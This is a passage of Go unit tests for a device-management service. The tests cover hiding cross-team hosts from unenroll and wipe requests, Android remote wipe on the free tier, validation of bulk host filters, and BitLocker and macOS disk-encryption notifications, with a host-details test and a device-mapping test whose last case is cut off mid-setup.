		})
	}
}

// A caller who can list hosts but has no access to the host's team must not be
// able to tell an existing host from a missing one.
func TestHostMDMEndpointsMaskCrossTeamDenial(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	const teamHostID = 1
	teamHost := &automdm.Host{ID: teamHostID, TeamID: new(uint(1)), Platform: "android", UUID: "android-uuid"}
	ds.HostFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
		return teamHost, nil
	}
	ds.HostLiteFunc = mock.HostLiteFunc(ds.HostFunc)
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true, AndroidEnabledAndConfigured: true}}, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}

	otherAutoMDM := automdm.Team{ID: 2}
	otherTeamUser := &automdm.User{Teams: []automdm.UserTeam{{Team: otherAutoMDM, Role: automdm.RoleAdmin}}}
	ctx = viewer.NewContext(ctx, viewer.Viewer{User: otherTeamUser})

	t.Run("UnenrollMDM", func(t *testing.T) {
		err := svc.UnenrollMDM(ctx, teamHostID)
		require.Error(t, err)
		require.True(t, automdm.IsNotFound(err), "expected a not-found error, got %v", err)
	})

	t.Run("WipeHost", func(t *testing.T) {
		err := svc.WipeHost(ctx, teamHostID)
		require.Error(t, err)
		require.True(t, automdm.IsNotFound(err), "expected a not-found error, got %v", err)
	})
}

// TestWipeHostFreeTierAndroid verifies the core (AutoMDM Free) WipeHost wipes Android hosts regardless of ownership. The
// non-Android license gate is already covered by the free-tier TestPremiumEndpointsWithoutLicense integration test, and
// Premium by TestAndroidLockWipeClearPasscode.
func TestWipeHostFreeTierAndroid(t *testing.T) {
	const hostID = 1
	testCases := []struct {
		name             string
		enrollmentStatus string
		androidEnabled   bool
		wantErr          string
	}{
		{name: "company-owned", enrollmentStatus: automdm.MDMEnrollmentStatusAutomatic, androidEnabled: true},
		{name: "personally-owned", enrollmentStatus: automdm.MDMEnrollmentStatusPersonal, androidEnabled: true},
		{
			name:             "android MDM off",
			enrollmentStatus: automdm.MDMEnrollmentStatusPersonal,
			androidEnabled:   false,
			wantErr:          automdm.AndroidMDMNotConfiguredMessage,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			ds := new(mock.Store)
			ds.HostFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
				return &automdm.Host{ID: hostID, Platform: "android", MDM: automdm.MDMHostData{EnrollmentStatus: new(tc.enrollmentStatus)}}, nil
			}
			ds.HostLiteFunc = mock.HostLiteFunc(ds.HostFunc)
			ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
				return &automdm.AppConfig{MDM: automdm.MDM{AndroidEnabledAndConfigured: tc.androidEnabled}}, nil
			}
			ds.IsHostConnectedToAutoMDMMDMFunc = func(ctx context.Context, host *automdm.Host) (bool, error) {
				return true, nil
			}
			ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
				return &automdm.HostLockWipeStatus{}, nil
			}

			var wipedHostID uint
			androidMock := &mockAndroidService{
				WipeAndroidHostFunc: func(_ context.Context, id uint) error {
					wipedHostID = id
					return nil
				},
			}
			// Default newTestService license is AutoMDM Free.
			opts := &TestServerOpts{SkipCreateTestUsers: true, AndroidModule: androidMock}
			svc, ctx := newTestService(t, ds, nil, nil, opts)
			ctx = viewer.NewContext(ctx, viewer.Viewer{User: &automdm.User{GlobalRole: new(automdm.RoleAdmin)}})

			var capturedActivity activity_api.ActivityDetails
			opts.ActivityMock.NewActivityFunc = func(_ context.Context, _ *activity_api.User, act activity_api.ActivityDetails) error {
				capturedActivity = act
				return nil
			}

			err := svc.WipeHost(ctx, hostID)
			if tc.wantErr != "" {
				require.ErrorContains(t, err, tc.wantErr)
				require.Zero(t, wipedHostID, "a rejected wipe must not reach AMAPI")
				require.Nil(t, capturedActivity)
				return
			}
			require.NoError(t, err)
			require.Equal(t, uint(hostID), wipedHostID)
			require.IsType(t, automdm.ActivityTypeWipedHost{}, capturedActivity)
		})
	}
}

func TestBulkOperationFilterValidation(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)
	viewerCtx := test.UserContext(ctx, test.UserAdmin)

	ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
		return []*automdm.Host{}, nil
	}

	ds.ListHostsInLabelFunc = func(ctx context.Context, filter automdm.TeamFilter, lid uint, opt automdm.HostListOptions) ([]*automdm.Host, error) {
		return []*automdm.Host{}, nil
	}

	// TODO(sarah): Future improvement to auto-generate a list of all possible filter values
	// from `automdm.HostListOptions` and iterate to test that only a limited subset of filter (i.e.
	// label_id, team_id, status, query) are allowed for bulk operations.
	tc := []struct {
		name       string
		filters    *map[string]any
		has400Err  bool
		removedKey string
	}{
		{
			name: "valid status filter",
			filters: &map[string]interface{}{
				"status": "new",
			},
		},
		{
			name: "invalid status",
			filters: &map[string]interface{}{
				"status": "invalid",
			},
			has400Err: true,
		},
		{
			name: "empty status is invalid",
			filters: &map[string]interface{}{
				"status": "",
			},
			has400Err: true,
		},

		{
			name: "valid team filter",
			filters: &map[string]interface{}{
				"team_id": float64(1), // json unmarshals to float64
			},
		},
		{
			name: "invalid team_id type",
			filters: &map[string]interface{}{
				"team_id": "invalid",
			},
			has400Err: true,
		},
		{
			name: "valid label_id filter",
			filters: &map[string]interface{}{
				"label_id": float64(1),
			},
		},
		{
			name: "invalid label_id type",
			filters: &map[string]interface{}{
				"label_id": "invalid",
			},
			has400Err: true,
		},

		{
			name: "invalid status type",
			filters: &map[string]interface{}{
				"status": float64(1),
			},
			has400Err: true,
		},
		{
			name:    "empty filter",
			filters: &map[string]interface{}{},
		},
		{
			name: "valid query filter",
			filters: &map[string]interface{}{
				"query": "test",
			},
		},
		{
			name: "invalid query type",
			filters: &map[string]interface{}{
				"query": float64(1),
			},
			has400Err: true,
		},
		{
			name: "empty query is invalid",
			filters: &map[string]interface{}{
				"query": "",
			},
			has400Err: true,
		},
		{
			name: "multiple valid filters",
			filters: &map[string]interface{}{
				"status":  "new",
				"team_id": float64(1),
				"query":   "test",
			},
		},
		{
			name: "mixed valid and invalid filters",
			filters: &map[string]interface{}{
				"status":  "new",
				"team_id": "invalid",
			},
			has400Err: true,
		},
		{
			name: "mixed invalid filters and valid filters (different order)",
			filters: &map[string]interface{}{
				"status":  "invalid",
				"team_id": 1,
			},
			has400Err: true,
		},
		{
			name: "mixed valid and unknown filters",
			filters: &map[string]interface{}{
				"status":  "new",
				"unknown": "filter",
			},
			has400Err: true,
		},
		{
			name: "unknown filter",
			filters: &map[string]interface{}{
				"unknown": "filter",
			},
			has400Err: true,
		},
	}

	checkErr := func(t *testing.T, err error, has400Err bool, removedKey string) {
		switch {
		case removedKey != "":
			rke, ok := errors.AsType[*endpointer.RemovedKeyError](err)
			require.True(t, ok, "got %v", err)
			require.Equal(t, removedKey, rke.Key)
		case has400Err:
			require.Error(t, err)
			var be *automdm.BadRequestError
			require.ErrorAs(t, err, &be)
		default:
			require.NoError(t, err)
		}
	}

	for _, tt := range tc {
		t.Run(tt.name, func(t *testing.T) {
			checkErr(t, svc.AddHostsToTeamByFilter(viewerCtx, nil, tt.filters), tt.has400Err, tt.removedKey)
			checkErr(t, svc.DeleteHosts(viewerCtx, nil, tt.filters), tt.has400Err, tt.removedKey)
		})
	}
}

func TestSetDiskEncryptionNotifications(t *testing.T) {
	ds := new(mock.Store)
	ctx := context.Background()
	svc := &Service{ds: ds, logger: slog.New(slog.DiscardHandler)}

	tests := []struct {
		name                     string
		host                     *automdm.Host
		appConfig                *automdm.AppConfig
		diskEncryptionConfigured bool
		isConnectedToAutoMDMMDM  bool
		mdmInfo                  *automdm.HostMDM
		getHostDiskEncryptionKey func(context.Context, uint) (*automdm.HostDiskEncryptionKey, error)
		expectedNotifications    *automdm.OrbitConfigNotifications
		expectedError            bool
		disableCapability        bool
	}{
		{
			name: "no MDM configured",
			host: &automdm.Host{ID: 1, Platform: "darwin", OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: false},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  nil,
			getHostDiskEncryptionKey: nil,
			expectedNotifications:    &automdm.OrbitConfigNotifications{},
			expectedError:            false,
		},
		{
			name: "not connected to AutoMDM",
			host: &automdm.Host{ID: 1, Platform: "darwin", OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  false,
			mdmInfo:                  nil,
			getHostDiskEncryptionKey: nil,
			expectedNotifications:    &automdm.OrbitConfigNotifications{},
			expectedError:            false,
		},
		{
			name: "host not enrolled in osquery",
			host: &automdm.Host{ID: 1, Platform: "darwin", OsqueryHostID: nil},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  nil,
			getHostDiskEncryptionKey: nil,
			expectedNotifications:    &automdm.OrbitConfigNotifications{},
			expectedError:            false,
		},
		{
			name: "disk encryption not configured",
			host: &automdm.Host{ID: 1, Platform: "darwin", OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: false,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  nil,
			getHostDiskEncryptionKey: nil,
			expectedNotifications:    &automdm.OrbitConfigNotifications{},
			expectedError:            false,
		},
		{
			name: "darwin with decryptable key",
			host: &automdm.Host{ID: 1, Platform: "darwin", OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  nil,
			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return &automdm.HostDiskEncryptionKey{Decryptable: new(true)}, nil
			},
			expectedNotifications: &automdm.OrbitConfigNotifications{
				RotateDiskEncryptionKey: false,
			},
			expectedError: false,
		},
		{
			name: "darwin needs rotation but client is old",
			host: &automdm.Host{ID: 1, Platform: "darwin", OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  nil,
			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return &automdm.HostDiskEncryptionKey{Decryptable: new(false)}, nil
			},
			expectedNotifications: &automdm.OrbitConfigNotifications{
				RotateDiskEncryptionKey: true,
			},
			expectedError:     false,
			disableCapability: true,
		},
		{
			name: "darwin needs rotation",
			host: &automdm.Host{ID: 1, Platform: "darwin", OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  nil,
			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return &automdm.HostDiskEncryptionKey{Decryptable: new(false)}, nil
			},
			expectedNotifications: &automdm.OrbitConfigNotifications{
				RotateDiskEncryptionKey: true,
			},
			expectedError: false,
		},
		{
			name: "windows server with no encryption needed",
			host: &automdm.Host{ID: 1, Platform: "windows", DiskEncryptionEnabled: new(true), OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  &automdm.HostMDM{IsServer: true},
			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return nil, newNotFoundError()
			},
			expectedNotifications: &automdm.OrbitConfigNotifications{
				EnforceBitLockerEncryption: false,
			},
			expectedError: false,
		},
		{
			// The wiring this feature exists for: encrypted, protection off, key escrowed and decryptable, so the
			// encrypt path stands down and the restore path is asked to act instead.
			name: "windows encrypted but unprotected is asked to restore protection",
			host: &automdm.Host{
				ID: 1, Platform: "windows", OsqueryHostID: new("foo"),
				DiskEncryptionEnabled:     new(true),
				BitLockerProtectionStatus: new(automdm.BitLockerProtectionStatusOff),
			},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  &automdm.HostMDM{IsServer: false},
			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return &automdm.HostDiskEncryptionKey{Decryptable: new(true)}, nil
			},
			expectedNotifications: &automdm.OrbitConfigNotifications{
				EnableBitLockerProtection: true,
			},
			expectedError: false,
		},
		{
			// Same qualifying state, but BitLocker is not managed on Windows Server, so the guard stops before the gate.
			name: "windows server encrypted but unprotected is left alone",
			host: &automdm.Host{
				ID: 1, Platform: "windows", OsqueryHostID: new("foo"),
				DiskEncryptionEnabled:     new(true),
				BitLockerProtectionStatus: new(automdm.BitLockerProtectionStatusOff),
			},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  &automdm.HostMDM{IsServer: true},
			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return &automdm.HostDiskEncryptionKey{Decryptable: new(true)}, nil
			},
			expectedNotifications: &automdm.OrbitConfigNotifications{},
			expectedError:         false,
		},
		{
			// A Windows host with no MDM row has nothing to enforce against.
			name: "windows with no mdm info",
			host: &automdm.Host{ID: 1, Platform: "windows", DiskEncryptionEnabled: new(false), OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  nil,
			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return nil, newNotFoundError()
			},
			expectedNotifications: &automdm.OrbitConfigNotifications{},
			expectedError:         false,
		},
		{
			name: "windows with encryption enabled but key missing",
			host: &automdm.Host{ID: 1, Platform: "windows", DiskEncryptionEnabled: new(true), OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  &automdm.HostMDM{IsServer: false},
			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return nil, newNotFoundError()
			},
			expectedNotifications: &automdm.OrbitConfigNotifications{
				EnforceBitLockerEncryption: true,
			},
			expectedError: false,
		},
		{
			name: "darwin with missing encryption key",
			host: &automdm.Host{ID: 1, Platform: "darwin", OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  nil,
			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return nil, newNotFoundError()
			},
			expectedNotifications: &automdm.OrbitConfigNotifications{
				RotateDiskEncryptionKey: false,
			},
			expectedError: false,
		},
		{
			name: "windows with encryption key and not decryptable",
			host: &automdm.Host{ID: 1, Platform: "windows", DiskEncryptionEnabled: new(true), OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  &automdm.HostMDM{IsServer: false},
			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return &automdm.HostDiskEncryptionKey{Decryptable: new(false)}, nil
			},
			expectedNotifications: &automdm.OrbitConfigNotifications{
				EnforceBitLockerEncryption: true,
			},
			expectedError: false,
		},
		{
			name: "windows with enforce BitLocker",
			host: &automdm.Host{ID: 1, Platform: "windows", DiskEncryptionEnabled: new(false), OsqueryHostID: new("foo")},
			appConfig: &automdm.AppConfig{
				MDM: automdm.MDM{EnabledAndConfigured: true},
			},
			diskEncryptionConfigured: true,
			isConnectedToAutoMDMMDM:  true,
			mdmInfo:                  &automdm.HostMDM{IsServer: false},
			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
				return nil, newNotFoundError()
			},
			expectedNotifications: &automdm.OrbitConfigNotifications{
				EnforceBitLockerEncryption: true,
			},
			expectedError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.getHostDiskEncryptionKey != nil {
				ds.GetHostDiskEncryptionKeyFunc = tt.getHostDiskEncryptionKey
			}
			ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
				return tt.appConfig, nil
			}
			ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, _ bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
				return &automdm.HostArchivedDiskEncryptionKey{}, nil
			}

			if !tt.disableCapability {
				r := http.Request{
					Header: http.Header{automdm.CapabilitiesHeader: []string{string(automdm.CapabilityEscrowBuddy)}},
				}
				ctx = capabilities.NewContext(ctx, &r)
			}

			// "configured" means configured for every platform; per-platform
			// gating has its own cases below the table-driven run
			var diskEncryption automdm.DiskEncryptionConfig
			if tt.diskEncryptionConfigured {
				diskEncryption = automdm.DiskEncryptionConfig{
					MacOSEnabled:       true,
					MacOSEscrowEnabled: true,
					WindowsEnabled:     true,
					LinuxEscrowEnabled: true,
				}
			}

			notifs := &automdm.OrbitConfigNotifications{}
			err := svc.setDiskEncryptionNotifications(
				ctx,
				notifs,
				tt.host,
				tt.appConfig,
				diskEncryption,
				tt.isConnectedToAutoMDMMDM,
				tt.mdmInfo,
			)

			if tt.expectedError {
				require.Error(t, err)
			} else {
				require.NoError(t, err)
			}
			require.Equal(t, tt.expectedNotifications, notifs)
		})
	}

	t.Run("notifications follow the host platform's setting, not the aggregate", func(t *testing.T) {
		appConfig := &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true, WindowsEnabledAndConfigured: true}}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return appConfig, nil
		}
		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
			return nil, newNotFoundError()
		}
		r := http.Request{
			Header: http.Header{automdm.CapabilitiesHeader: []string{string(automdm.CapabilityEscrowBuddy)}},
		}
		ctx := capabilities.NewContext(ctx, &r)

		windowsHost := &automdm.Host{ID: 1, Platform: "windows", DiskEncryptionEnabled: new(false), OsqueryHostID: new("foo")}
		macHost := &automdm.Host{ID: 2, Platform: "darwin", OsqueryHostID: new("foo")}
		mdmInfo := &automdm.HostMDM{IsServer: false}

		// only Windows configured: the Windows host is notified even though the
		// aggregate (AND of the four settings) is off
		notifs := &automdm.OrbitConfigNotifications{}
		err := svc.setDiskEncryptionNotifications(ctx, notifs, windowsHost, appConfig,
			automdm.DiskEncryptionConfig{WindowsEnabled: true}, true, mdmInfo)
		require.NoError(t, err)
		require.True(t, notifs.EnforceBitLockerEncryption)

		// only macOS configured: the Windows host is not notified
		notifs = &automdm.OrbitConfigNotifications{}
		err = svc.setDiskEncryptionNotifications(ctx, notifs, windowsHost, appConfig,
			automdm.DiskEncryptionConfig{MacOSEnabled: true, MacOSEscrowEnabled: true}, true, mdmInfo)
		require.NoError(t, err)
		require.False(t, notifs.EnforceBitLockerEncryption)

		// only Windows configured: the macOS host's key-fetch path is skipped
		// entirely, so no rotation is requested
		notifs = &automdm.OrbitConfigNotifications{}
		err = svc.setDiskEncryptionNotifications(ctx, notifs, macHost, appConfig,
			automdm.DiskEncryptionConfig{WindowsEnabled: true}, true, mdmInfo)
		require.NoError(t, err)
		require.False(t, notifs.RotateDiskEncryptionKey)
	})

	// Only the agent can clear an error it reported, by reporting a later success, so a host carrying one has to keep
	// being asked.
	t.Run("a reported error keeps the host being asked", func(t *testing.T) {
		appConfig := &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true, WindowsEnabledAndConfigured: true}}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return appConfig, nil
		}
		mdmInfo := &automdm.HostMDM{IsServer: false}
		// Encrypted, with a key AutoMDM can decrypt: nothing else would ask this host to do anything.
		host := &automdm.Host{ID: 1, Platform: "windows", DiskEncryptionEnabled: new(true), OsqueryHostID: new("foo")}

		for _, tc := range []struct {
			name        string
			clientError string
			want        bool
		}{
			{name: "no reported error, so the host is left alone", clientError: "", want: false},
			{name: "a reported error keeps enforcement on", clientError: "a BitLocker decryption is paused on this host", want: true},
		} {
			t.Run(tc.name, func(t *testing.T) {
				ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
					return &automdm.HostDiskEncryptionKey{
						HostID:          id,
						Base64Encrypted: "a-key",
						Decryptable:     new(true),
						ClientError:     tc.clientError,
					}, nil
				}

				notifs := &automdm.OrbitConfigNotifications{}
				err := svc.setDiskEncryptionNotifications(ctx, notifs, host, appConfig,
					automdm.DiskEncryptionConfig{WindowsEnabled: true}, true, mdmInfo)
				require.NoError(t, err)
				require.Equal(t, tc.want, notifs.EnforceBitLockerEncryption)
			})
		}
	})

	t.Run("macOS rotation follows escrow, not enforcement", func(t *testing.T) {
		appConfig := &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return appConfig, nil
		}
		// a key that AutoMDM cannot decrypt is what makes rotation wanted
		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
			return &automdm.HostDiskEncryptionKey{Decryptable: new(false)}, nil
		}
		r := http.Request{
			Header: http.Header{automdm.CapabilitiesHeader: []string{string(automdm.CapabilityEscrowBuddy)}},
		}
		ctx := capabilities.NewContext(ctx, &r)
		macHost := &automdm.Host{ID: 2, Platform: "darwin", OsqueryHostID: new("foo")}
		mdmInfo := &automdm.HostMDM{IsServer: false}

		// escrow on: Escrow Buddy is asked to produce a key AutoMDM can store
		notifs := &automdm.OrbitConfigNotifications{}
		err := svc.setDiskEncryptionNotifications(ctx, notifs, macHost, appConfig,
			automdm.DiskEncryptionConfig{MacOSEscrowEnabled: true}, true, mdmInfo)
		require.NoError(t, err)
		require.True(t, notifs.RotateDiskEncryptionKey)

		// enforcement alone: the profile carries no escrow payload, so rotating
		// would produce a key with nowhere to go
		notifs = &automdm.OrbitConfigNotifications{}
		err = svc.setDiskEncryptionNotifications(ctx, notifs, macHost, appConfig,
			automdm.DiskEncryptionConfig{MacOSEnabled: true}, true, mdmInfo)
		require.NoError(t, err)
		require.False(t, notifs.RotateDiskEncryptionKey)
	})
}

func TestGetHostDetailsExcludeSoftwareFlag(t *testing.T) {
	ds := new(mock.Store)
	svc := &Service{ds: ds}

	baseHost := &automdm.Host{ID: 42}

	// common DS mocks
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}
	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return nil, nil
	}
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) {
		return nil, nil
	}
	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostBattery, error) {
		return nil, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
		return false, nil
	}

	t.Run("ExcludeSoftware=true returns empty slice", func(t *testing.T) {
		ds.LoadHostSoftwareFuncInvoked = false
		ds.LoadHostSoftwareFunc = func(ctx context.Context, h *automdm.Host, includeCVEScores bool) error {
			t.Fatalf("LoadHostSoftwareFunc should not be called when ExcludeSoftware is true")
			return nil
		}

		opts := automdm.HostDetailOptions{ExcludeSoftware: true}
		hostDetail, err := svc.getHostDetails(test.UserContext(context.Background(), test.UserAdmin), baseHost, opts)
		require.NoError(t, err)

		require.NotNil(t, hostDetail.Software, "Software slice should not be nil")
		assert.Len(t, hostDetail.Software, 0, "Software slice should be empty when excluded")
	})

	t.Run("ExcludeSoftware=false returns filled slice", func(t *testing.T) {
		expectedSoftware := []automdm.HostSoftwareEntry{
			{
				Software: automdm.Software{
					ID:      1,
					Name:    "test-app",
					Version: "1.0.0",
					Source:  "apps",
				},
				InstalledPaths: []string{"/Applications/test-app.app"},
			},
			{
				Software: automdm.Software{
					ID:      2,
					Name:    "another-app",
					Version: "2.3.4",
					Source:  "apps",
				},
				InstalledPaths: []string{"/Applications/another-app.app"},
			},
		}

		ds.LoadHostSoftwareFuncInvoked = false
		ds.LoadHostSoftwareFunc = func(ctx context.Context, h *automdm.Host, includeCVEScores bool) error {
			h.HostSoftware.Software = expectedSoftware
			return nil
		}

		opts := automdm.HostDetailOptions{ExcludeSoftware: false}
		hostDetail, err := svc.getHostDetails(test.UserContext(context.Background(), test.UserAdmin), baseHost, opts)
		require.NoError(t, err)

		require.NotNil(t, hostDetail.Software)
		assert.Equal(t, expectedSoftware, hostDetail.Software)
		assert.True(t, ds.LoadHostSoftwareFuncInvoked, "LoadHostSoftwareFunc should have been called")
	})
}

func TestSetHostDeviceMapping(t *testing.T) {
	t.Run("custom source success", func(t *testing.T) {
		ds := new(mock.Store)
		svc, ctx := newTestService(t, ds, nil, nil)

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1}, nil
		}
		ds.SetOrUpdateCustomHostDeviceMappingFunc = func(ctx context.Context, hostID uint, email, source string) ([]*automdm.HostDeviceMapping, error) {
			return []*automdm.HostDeviceMapping{{HostID: hostID, Email: email, Source: source}}, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		result, err := svc.SetHostDeviceMapping(userCtx, 1, "user@example.com", "custom")
		require.NoError(t, err)
		require.True(t, ds.SetOrUpdateCustomHostDeviceMappingFuncInvoked)
		require.NotNil(t, result)
		require.Len(t, result, 1)
		assert.Equal(t, uint(1), result[0].HostID)
		assert.Equal(t, "user@example.com", result[0].Email)
	})

	t.Run("empty source defaults to custom", func(t *testing.T) {
		ds := new(mock.Store)
		svc, ctx := newTestService(t, ds, nil, nil)

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1}, nil
		}
		ds.SetOrUpdateCustomHostDeviceMappingFunc = func(ctx context.Context, hostID uint, email, source string) ([]*automdm.HostDeviceMapping, error) {
			require.Equal(t, automdm.DeviceMappingCustomOverride, source)                                                            // Should store as custom_override for user-authenticated calls
			return []*automdm.HostDeviceMapping{{HostID: hostID, Email: email, Source: automdm.DeviceMappingCustomReplacement}}, nil // But return as "custom" for display
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		result, err := svc.SetHostDeviceMapping(userCtx, 1, "user@example.com", "")
		require.NoError(t, err)
		require.True(t, ds.SetOrUpdateCustomHostDeviceMappingFuncInvoked)
		require.NotNil(t, result)
	})

	t.Run("IDP source success with valid SCIM user", func(t *testing.T) {
		ds := new(mock.Store)
		opts := &TestServerOpts{License: &automdm.LicenseInfo{Tier: automdm.TierPremium}}
		svc, ctx := newTestService(t, ds, nil, nil, opts)

		var resentCerts []uint
		opts.ActivityMock.NewActivityFunc = func(_ context.Context, _ *activity_api.User, act activity_api.ActivityDetails) error {
			if cert, ok := act.(automdm.ActivityTypeResentCertificate); ok {
				resentCerts = append(resentCerts, cert.CertificateTemplateID)
			}
			return nil
		}

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1, UUID: "host-uuid-1"}, nil
		}
		ds.GetHostEmailsFunc = func(ctx context.Context, hostUUID string, source string) ([]string, error) {
			return nil, nil // No existing IDP email
		}
